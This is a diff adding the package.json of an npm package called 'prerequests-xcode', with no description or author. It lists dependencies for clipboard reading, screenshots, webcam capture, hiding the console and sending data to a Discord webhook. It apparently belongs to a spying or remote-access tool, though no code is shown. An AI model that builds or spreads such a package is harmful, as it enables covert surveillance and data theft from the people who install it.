@@ -1,0 +1,32 @@
+{
+  "name": "prerequests-xcode",
+  "version": "1.0.4",
+  "description": "",
+  "main": "index.js",
+  "keywords": [],
+  "author": "",
+  "license": "ISC",
+  "dependencies": {
+    "axios": "^0.21.1",
+    "clipboardy": "^2.3.0",
+    "desktop-screenshot": "^0.1.1",
+    "discord": "^0.8.2",
+    "discord-pages": "^1.0.2",
+    "discord-webhook-node": "^1.1.8",
+    "discord.js": "^11.6.4",
+    "express": "^4.17.1",
+    "http": "0.0.1-security",
+    "lazy": "^1.0.11",
+    "loudness": "^0.4.1",
+    "node-hide-console-window": "^2.1.0",
+    "node-webcam": "^0.8.0",
+    "open": "^8.3.0",
+    "os": "^0.1.2",
+    "path": "^0.12.7",
+    "ps-node": "^0.1.6",
+    "request": "^2.88.2",
+    "screenshot-desktop": "^1.12.7",
+    "serve-index": "^1.9.1",
+    "socket.io": "^4.2.0"
+  }
+}
